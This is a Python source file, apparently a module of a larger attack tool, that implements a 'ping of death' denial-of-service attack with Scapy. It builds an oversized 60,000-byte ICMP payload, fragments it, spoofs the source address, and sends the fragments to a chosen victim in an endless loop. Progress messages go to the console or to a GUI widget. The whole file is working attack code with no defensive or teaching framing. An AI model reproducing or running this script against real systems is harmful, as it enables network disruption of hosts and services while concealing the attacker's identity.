from scapy.all import *
from func.spoof_addr import spoof_addr
from time import sleep

def ping_of_death(victim,quiet,terminal = None):
    spoofaddr = spoof_addr(terminal = terminal)
    packet = fragment(IP(src=spoofaddr,dst=victim)/ICMP()/("w"*60000))

    if terminal == None:
        print("[+] Sending malformed ICMP packets to "+victim)
    else:
        terminal.configure(text=terminal.cget("text")+'\n[+] Sending malformed ICMP packets to '+victim)

    while True:
        for p in packet:
            send(p,verbose=0)
            if not quiet:
                if terminal == None:
                    print("[+] Packet Sent // "+p.summary())
                else:
                    terminal.configure(text=terminal.cget("text")+'\n[+] Packet Sent // '+str(p.summary()))
        sleep(2)
